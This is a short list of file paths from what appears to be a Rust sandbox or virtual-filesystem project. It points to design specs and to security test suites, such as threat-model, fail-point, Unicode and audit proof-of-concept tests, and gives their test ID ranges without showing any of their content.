- `specs/vfs.md` - Virtual filesystem design
- `specs/security-testing.md` - Fail-point testing
- `specs/python-builtin.md` - Python builtin specification
- `src/builtins/system.rs` - Hardcoded system builtins
- `tests/threat_model_tests.rs` - Threat model test suite
- `tests/security_failpoint_tests.rs` - Fail-point security tests
- `tests/unicode_security_tests.rs` - Unicode security tests (TM-UNI-*)
- `tests/security_audit_pocs.rs` - PoC tests for 2026-03 deep audit (TM-INJ-012–016, TM-INF-017–018, TM-DOS-041–050, TM-PY-028)
